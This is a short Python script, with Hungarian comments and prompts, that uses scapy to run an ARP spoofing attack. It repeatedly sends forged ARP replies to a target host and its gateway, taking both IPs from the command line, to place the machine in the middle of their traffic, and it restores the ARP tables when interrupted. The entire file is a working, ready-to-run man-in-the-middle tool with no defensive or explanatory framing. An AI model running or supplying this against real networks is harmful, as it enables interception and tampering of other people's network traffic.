import scapy.all as scapy
import time
import argparse

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc if answered_list else None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac:
        # Layer 2 konstrukció a hibaüzenetek elkerülésére
        packet = scapy.Ether(dst=target_mac)/scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.sendp(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    if destination_mac and source_mac:
        packet = scapy.Ether(dst=destination_mac)/scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.sendp(packet, count=4, verbose=False)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", help="Célpont IP", required=True)
    parser.add_argument("-g", "--gateway", help="Router IP", required=True)
    args = parser.parse_args()

    try:
        print(f"[*] ARP Spoofing: {args.target} <-> {args.gateway}")
        while True:
            spoof(args.target, args.gateway)
            spoof(args.gateway, args.target)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Hálózat helyreállítása...")
        restore(args.target, args.gateway)
        restore(args.gateway, args.target)